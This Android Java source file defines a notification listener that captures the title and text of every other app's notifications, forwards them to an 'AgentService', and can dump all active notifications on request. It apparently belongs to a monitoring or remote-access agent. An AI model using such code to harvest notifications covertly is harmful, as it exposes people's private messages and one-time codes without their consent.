package com.rk.agent;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotifListener extends NotificationListenerService {

    public static NotifListener instance;

    @Override public void onListenerConnected() { instance = this; }
    @Override public void onListenerDisconnected() { instance = null; }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn == null || sbn.getNotification() == null) return;
            Bundle ext = sbn.getNotification().extras;
            String pkg = sbn.getPackageName();
            if (pkg.equals("com.rk.agent")) return;

            String title = ext.getString(Notification.EXTRA_TITLE, "");
            String text = ext.getString(Notification.EXTRA_TEXT, "");
            if (text == null || text.isEmpty())
                text = ext.getString(Notification.EXTRA_BIG_TEXT, "");
            if (title == null) title = "";
            if (text == null) text = "";
            if (title.isEmpty() && text.isEmpty()) return;

            AgentService.sendFromNotif(pkg, title, text);
        } catch (Exception ignored) {}
    }

    public static String dumpActive() {
        if (instance == null) return "listener not connected";
        try {
            StatusBarNotification[] arr = instance.getActiveNotifications();
            if (arr == null || arr.length == 0) return "(none)";
            StringBuilder sb = new StringBuilder();
            for (StatusBarNotification sbn : arr) {
                Bundle ext = sbn.getNotification().extras;
                String pkg = sbn.getPackageName();
                String title = ext.getString(Notification.EXTRA_TITLE, "");
                String text = ext.getString(Notification.EXTRA_TEXT, "");
                if (title == null) title = "";
                if (text == null) text = "";
                sb.append("[").append(pkg).append("]\n")
                  .append(title).append(": ").append(text).append("\n\n");
            }
            return sb.toString();
        } catch (Exception e) { return "err: " + e.getMessage(); }
    }
}
